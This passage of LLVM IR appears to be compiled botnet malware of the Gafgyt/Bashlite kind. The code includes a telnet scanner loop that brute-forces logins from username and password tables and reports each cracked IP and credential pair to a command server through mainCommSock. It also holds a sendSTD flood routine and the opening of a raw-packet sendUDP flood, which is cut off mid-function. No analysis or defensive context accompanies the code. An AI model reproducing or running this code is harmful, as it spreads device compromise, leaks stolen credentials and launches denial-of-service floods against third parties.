  %1965 = sext i32 %1964 to i64
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1965
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1966, i32 0, i32 2
  store i8 0, i8* %1967, align 8
  %1968 = load i32, i32* %2, align 4
  %1969 = sext i32 %1968 to i64
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1969
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1970, i32 0, i32 3
  store i8 1, i8* %1971, align 1
  br label %2316

; <label>:1972:                                   ; preds = %1949
  %1973 = load i32, i32* %2, align 4
  %1974 = sext i32 %1973 to i64
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1974
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1975, i32 0, i32 2
  store i8 8, i8* %1976, align 8
  br label %2315

; <label>:1977:                                   ; preds = %71
  %1978 = load i32, i32* %2, align 4
  %1979 = sext i32 %1978 to i64
  %1980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1979
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1980, i32 0, i32 0
  %1982 = load i32, i32* %1981, align 16
  %1983 = call i64 @send(i32 %1982, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i64 9, i32 16384)
  %1984 = icmp slt i64 %1983, 0
  br i1 %1984, label %1985, label %2000

; <label>:1985:                                   ; preds = %1977
  %1986 = load i32, i32* %2, align 4
  %1987 = sext i32 %1986 to i64
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1987
  %1989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1988, i32 0, i32 0
  %1990 = load i32, i32* %1989, align 16
  %1991 = call i32 @sclose(i32 %1990)
  %1992 = load i32, i32* %2, align 4
  %1993 = sext i32 %1992 to i64
  %1994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1993
  %1995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1994, i32 0, i32 2
  store i8 0, i8* %1995, align 8
  %1996 = load i32, i32* %2, align 4
  %1997 = sext i32 %1996 to i64
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1997
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1998, i32 0, i32 3
  store i8 1, i8* %1999, align 1
  br label %2316

; <label>:2000:                                   ; preds = %1977
  %2001 = load i32, i32* %2, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2002
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2003, i32 0, i32 2
  store i8 9, i8* %2004, align 8
  br label %2315

; <label>:2005:                                   ; preds = %71
  %2006 = load i32, i32* %2, align 4
  %2007 = sext i32 %2006 to i64
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2007
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2008, i32 0, i32 0
  %2010 = load i32, i32* %2009, align 16
  %2011 = call i64 @send(i32 %2010, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2012 = icmp slt i64 %2011, 0
  br i1 %2012, label %2013, label %2028

; <label>:2013:                                   ; preds = %2005
  %2014 = load i32, i32* %2, align 4
  %2015 = sext i32 %2014 to i64
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2015
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2016, i32 0, i32 0
  %2018 = load i32, i32* %2017, align 16
  %2019 = call i32 @sclose(i32 %2018)
  %2020 = load i32, i32* %2, align 4
  %2021 = sext i32 %2020 to i64
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2021
  %2023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2022, i32 0, i32 2
  store i8 0, i8* %2023, align 8
  %2024 = load i32, i32* %2, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2025
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2026, i32 0, i32 3
  store i8 1, i8* %2027, align 1
  br label %2316

; <label>:2028:                                   ; preds = %2005
  %2029 = load i32, i32* @mainCommSock, align 4
  %2030 = load i32, i32* %2, align 4
  %2031 = sext i32 %2030 to i64
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 1
  %2034 = bitcast i32* %2033 to %struct.in_addr*
  %2035 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2034, i32 0, i32 0
  %2036 = load i32, i32* %2035, align 4
  %2037 = call i8* @inet_ntoa(i32 %2036) #2
  %2038 = load i32, i32* %2, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2039
  %2041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2040, i32 0, i32 4
  %2042 = load i8, i8* %2041, align 2
  %2043 = zext i8 %2042 to i64
  %2044 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2043
  %2045 = load i8*, i8** %2044, align 8
  %2046 = load i32, i32* %2, align 4
  %2047 = sext i32 %2046 to i64
  %2048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2047
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2048, i32 0, i32 5
  %2050 = load i8, i8* %2049, align 1
  %2051 = zext i8 %2050 to i64
  %2052 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2051
  %2053 = load i8*, i8** %2052, align 8
  %2054 = call i32 (i32, i8*, ...) @sockprintf(i32 %2029, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2037, i8* %2045, i8* %2053)
  %2055 = load i32, i32* %2, align 4
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2057, i32 0, i32 2
  store i8 10, i8* %2058, align 8
  br label %2315

; <label>:2059:                                   ; preds = %71
  %2060 = load i32, i32* %2, align 4
  %2061 = sext i32 %2060 to i64
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2061
  %2063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2062, i32 0, i32 6
  %2064 = load i32, i32* %2063, align 4
  %2065 = icmp eq i32 %2064, 0
  br i1 %2065, label %2066, label %2073

; <label>:2066:                                   ; preds = %2059
  %2067 = call i64 @time(i64* null) #2
  %2068 = trunc i64 %2067 to i32
  %2069 = load i32, i32* %2, align 4
  %2070 = sext i32 %2069 to i64
  %2071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2070
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2071, i32 0, i32 6
  store i32 %2068, i32* %2072, align 4
  br label %2073

; <label>:2073:                                   ; preds = %2066, %2059
  %2074 = load i32, i32* %2, align 4
  %2075 = sext i32 %2074 to i64
  %2076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2075
  %2077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2076, i32 0, i32 0
  %2078 = load i32, i32* %2077, align 16
  %2079 = load i32, i32* %2, align 4
  %2080 = sext i32 %2079 to i64
  %2081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2080
  %2082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2081, i32 0, i32 8
  %2083 = load i8*, i8** %2082, align 8
  %2084 = load i32, i32* %2, align 4
  %2085 = sext i32 %2084 to i64
  %2086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2085
  %2087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2086, i32 0, i32 7
  %2088 = load i16, i16* %2087, align 16
  %2089 = zext i16 %2088 to i32
  %2090 = call i32 @readUntil(i32 %2078, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2083, i32 1024, i32 %2089)
  %2091 = icmp ne i32 %2090, 0
  br i1 %2091, label %2092, label %2133

; <label>:2092:                                   ; preds = %2073
  %2093 = load i32, i32* %2, align 4
  %2094 = sext i32 %2093 to i64
  %2095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2094
  %2096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2095, i32 0, i32 6
  store i32 0, i32* %2096, align 4
  %2097 = load i32, i32* %2, align 4
  %2098 = sext i32 %2097 to i64
  %2099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2098
  %2100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2099, i32 0, i32 7
  store i16 0, i16* %2100, align 16
  %2101 = load i32, i32* %2, align 4
  %2102 = sext i32 %2101 to i64
  %2103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2102
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2103, i32 0, i32 0
  %2105 = load i32, i32* %2104, align 16
  %2106 = call i64 @send(i32 %2105, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2107 = load i32, i32* @mainCommSock, align 4
  %2108 = load i32, i32* %2, align 4
  %2109 = sext i32 %2108 to i64
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2109
  %2111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2110, i32 0, i32 1
  %2112 = bitcast i32* %2111 to %struct.in_addr*
  %2113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2112, i32 0, i32 0
  %2114 = load i32, i32* %2113, align 4
  %2115 = call i8* @inet_ntoa(i32 %2114) #2
  %2116 = load i32, i32* %2, align 4
  %2117 = sext i32 %2116 to i64
  %2118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2117
  %2119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2118, i32 0, i32 4
  %2120 = load i8, i8* %2119, align 2
  %2121 = zext i8 %2120 to i64
  %2122 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2121
  %2123 = load i8*, i8** %2122, align 8
  %2124 = load i32, i32* %2, align 4
  %2125 = sext i32 %2124 to i64
  %2126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2125
  %2127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2126, i32 0, i32 5
  %2128 = load i8, i8* %2127, align 1
  %2129 = zext i8 %2128 to i64
  %2130 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2129
  %2131 = load i8*, i8** %2130, align 8
  %2132 = call i32 (i32, i8*, ...) @sockprintf(i32 %2107, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2115, i8* %2123, i8* %2131)
  br label %2316

; <label>:2133:                                   ; preds = %2073
  %2134 = load i32, i32* %2, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2135
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2136, i32 0, i32 0
  %2138 = load i32, i32* %2137, align 16
  %2139 = load i32, i32* %2, align 4
  %2140 = sext i32 %2139 to i64
  %2141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2140
  %2142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2141, i32 0, i32 8
  %2143 = load i8*, i8** %2142, align 8
  %2144 = load i32, i32* %2, align 4
  %2145 = sext i32 %2144 to i64
  %2146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2145
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2146, i32 0, i32 7
  %2148 = load i16, i16* %2147, align 16
  %2149 = zext i16 %2148 to i32
  %2150 = call i32 @readUntil(i32 %2138, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2143, i32 1024, i32 %2149)
  %2151 = icmp ne i32 %2150, 0
  br i1 %2151, label %2152, label %2193

; <label>:2152:                                   ; preds = %2133
  %2153 = load i32, i32* %2, align 4
  %2154 = sext i32 %2153 to i64
  %2155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2154
  %2156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2155, i32 0, i32 6
  store i32 0, i32* %2156, align 4
  %2157 = load i32, i32* %2, align 4
  %2158 = sext i32 %2157 to i64
  %2159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2158
  %2160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2159, i32 0, i32 7
  store i16 0, i16* %2160, align 16
  %2161 = load i32, i32* %2, align 4
  %2162 = sext i32 %2161 to i64
  %2163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2162
  %2164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2163, i32 0, i32 0
  %2165 = load i32, i32* %2164, align 16
  %2166 = call i64 @send(i32 %2165, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2167 = load i32, i32* @mainCommSock, align 4
  %2168 = load i32, i32* %2, align 4
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2169
  %2171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2170, i32 0, i32 1
  %2172 = bitcast i32* %2171 to %struct.in_addr*
  %2173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2172, i32 0, i32 0
  %2174 = load i32, i32* %2173, align 4
  %2175 = call i8* @inet_ntoa(i32 %2174) #2
  %2176 = load i32, i32* %2, align 4
  %2177 = sext i32 %2176 to i64
  %2178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2177
  %2179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2178, i32 0, i32 4
  %2180 = load i8, i8* %2179, align 2
  %2181 = zext i8 %2180 to i64
  %2182 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2181
  %2183 = load i8*, i8** %2182, align 8
  %2184 = load i32, i32* %2, align 4
  %2185 = sext i32 %2184 to i64
  %2186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2185
  %2187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2186, i32 0, i32 5
  %2188 = load i8, i8* %2187, align 1
  %2189 = zext i8 %2188 to i64
  %2190 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2189
  %2191 = load i8*, i8** %2190, align 8
  %2192 = call i32 (i32, i8*, ...) @sockprintf(i32 %2167, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2175, i8* %2183, i8* %2191)
  br label %2316

; <label>:2193:                                   ; preds = %2133
  %2194 = load i32, i32* %2, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2196, i32 0, i32 0
  %2198 = load i32, i32* %2197, align 16
  %2199 = load i32, i32* %2, align 4
  %2200 = sext i32 %2199 to i64
  %2201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2200
  %2202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2201, i32 0, i32 8
  %2203 = load i8*, i8** %2202, align 8
  %2204 = load i32, i32* %2, align 4
  %2205 = sext i32 %2204 to i64
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2205
  %2207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2206, i32 0, i32 7
  %2208 = load i16, i16* %2207, align 16
  %2209 = zext i16 %2208 to i32
  %2210 = call i32 @readUntil(i32 %2198, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2203, i32 1024, i32 %2209)
  %2211 = icmp ne i32 %2210, 0
  br i1 %2211, label %2212, label %2272

; <label>:2212:                                   ; preds = %2193
  %2213 = load i32, i32* %2, align 4
  %2214 = sext i32 %2213 to i64
  %2215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2214
  %2216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2215, i32 0, i32 6
  store i32 0, i32* %2216, align 4
  %2217 = load i32, i32* %2, align 4
  %2218 = sext i32 %2217 to i64
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2218
  %2220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2219, i32 0, i32 7
  store i16 0, i16* %2220, align 16
  %2221 = load i32, i32* %2, align 4
  %2222 = sext i32 %2221 to i64
  %2223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2222
  %2224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2223, i32 0, i32 0
  %2225 = load i32, i32* %2224, align 16
  %2226 = call i64 @send(i32 %2225, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2227 = load i32, i32* @mainCommSock, align 4
  %2228 = load i32, i32* %2, align 4
  %2229 = sext i32 %2228 to i64
  %2230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2229
  %2231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2230, i32 0, i32 1
  %2232 = bitcast i32* %2231 to %struct.in_addr*
  %2233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2232, i32 0, i32 0
  %2234 = load i32, i32* %2233, align 4
  %2235 = call i8* @inet_ntoa(i32 %2234) #2
  %2236 = load i32, i32* %2, align 4
  %2237 = sext i32 %2236 to i64
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2237
  %2239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2238, i32 0, i32 4
  %2240 = load i8, i8* %2239, align 2
  %2241 = zext i8 %2240 to i64
  %2242 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2241
  %2243 = load i8*, i8** %2242, align 8
  %2244 = load i32, i32* %2, align 4
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2245
  %2247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2246, i32 0, i32 5
  %2248 = load i8, i8* %2247, align 1
  %2249 = zext i8 %2248 to i64
  %2250 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2249
  %2251 = load i8*, i8** %2250, align 8
  %2252 = call i32 (i32, i8*, ...) @sockprintf(i32 %2227, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2235, i8* %2243, i8* %2251)
  %2253 = load i32, i32* %2, align 4
  %2254 = sext i32 %2253 to i64
  %2255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2254
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2255, i32 0, i32 8
  %2257 = load i8*, i8** %2256, align 8
  call void @llvm.memset.p0i8.i64(i8* %2257, i8 0, i64 1024, i32 1, i1 false)
  %2258 = load i32, i32* %2, align 4
  %2259 = sext i32 %2258 to i64
  %2260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2259
  %2261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2260, i32 0, i32 0
  %2262 = load i32, i32* %2261, align 16
  %2263 = call i32 @sclose(i32 %2262)
  %2264 = load i32, i32* %2, align 4
  %2265 = sext i32 %2264 to i64
  %2266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2265
  %2267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2266, i32 0, i32 3
  store i8 1, i8* %2267, align 1
  %2268 = load i32, i32* %2, align 4
  %2269 = sext i32 %2268 to i64
  %2270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2269
  %2271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2270, i32 0, i32 2
  store i8 0, i8* %2271, align 8
  br label %2316

; <label>:2272:                                   ; preds = %2193
  %2273 = load i32, i32* %2, align 4
  %2274 = sext i32 %2273 to i64
  %2275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2274
  %2276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2275, i32 0, i32 8
  %2277 = load i8*, i8** %2276, align 8
  %2278 = call i64 @strlen(i8* %2277) #10
  %2279 = trunc i64 %2278 to i16
  %2280 = load i32, i32* %2, align 4
  %2281 = sext i32 %2280 to i64
  %2282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2281
  %2283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2282, i32 0, i32 7
  store i16 %2279, i16* %2283, align 16
  br label %2284

; <label>:2284:                                   ; preds = %2272
  br label %2285

; <label>:2285:                                   ; preds = %2284
  br label %2286

; <label>:2286:                                   ; preds = %2285
  %2287 = load i32, i32* %2, align 4
  %2288 = sext i32 %2287 to i64
  %2289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2288
  %2290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2289, i32 0, i32 6
  %2291 = load i32, i32* %2290, align 4
  %2292 = sub i32 %2291, -1373256750
  %2293 = add i32 %2292, 10
  %2294 = add i32 %2293, -1373256750
  %2295 = add i32 %2291, 10
  %2296 = zext i32 %2294 to i64
  %2297 = call i64 @time(i64* null) #2
  %2298 = icmp slt i64 %2296, %2297
  br i1 %2298, label %2299, label %2314

; <label>:2299:                                   ; preds = %2286
  %2300 = load i32, i32* %2, align 4
  %2301 = sext i32 %2300 to i64
  %2302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2301
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2302, i32 0, i32 0
  %2304 = load i32, i32* %2303, align 16
  %2305 = call i32 @sclose(i32 %2304)
  %2306 = load i32, i32* %2, align 4
  %2307 = sext i32 %2306 to i64
  %2308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2307
  %2309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2308, i32 0, i32 2
  store i8 0, i8* %2309, align 8
  %2310 = load i32, i32* %2, align 4
  %2311 = sext i32 %2310 to i64
  %2312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2311
  %2313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2312, i32 0, i32 3
  store i8 1, i8* %2313, align 1
  br label %2314

; <label>:2314:                                   ; preds = %2299, %2286
  br label %2315

; <label>:2315:                                   ; preds = %2314, %2028, %2000, %1972, %1948, %1240, %1176, %808, %744, %430, %243, %71
  br label %2316

; <label>:2316:                                   ; preds = %2315, %2212, %2152, %2092, %2013, %1985, %1957, %1903, %1878, %1837, %1812, %1771, %1746, %1705, %1680, %1639, %1614, %1573, %1548, %1507, %1482, %1441, %1416, %1388, %1347, %1322, %1294, %1225, %1202, %1121, %1098, %1075, %1052, %1029, %1006, %983, %960, %937, %923, %872, %793, %770, %695, %644, %593, %542, %491, %344, %193, %149
  %2317 = load i32, i32* %2, align 4
  %2318 = sub i32 0, 1
  %2319 = sub i32 %2317, %2318
  %2320 = add nsw i32 %2317, 1
  store i32 %2319, i32* %2, align 4
  br label %67

; <label>:2321:                                   ; preds = %67
  br label %65
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #2
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

; <label>:36:                                     ; preds = %59, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %59

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0), i64 50, i32 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  %45 = call i64 @time(i64* null) #2
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, %46
  %50 = sub i64 0, %48
  %51 = add i64 %49, %50
  %52 = sub i64 0, %51
  %53 = add nsw i64 %46, %48
  %54 = icmp sge i64 %45, %52
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %39
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @close(i32 %56)
  call void @_exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %39
  store i32 0, i32* %11, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %36
  %60 = load i32, i32* %11, align 4
  %61 = sub i32 0, 1
  %62 = sub i32 %60, %61
  %63 = add i32 %60, 1
  store i32 %62, i32* %11, align 4
  br label %36
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
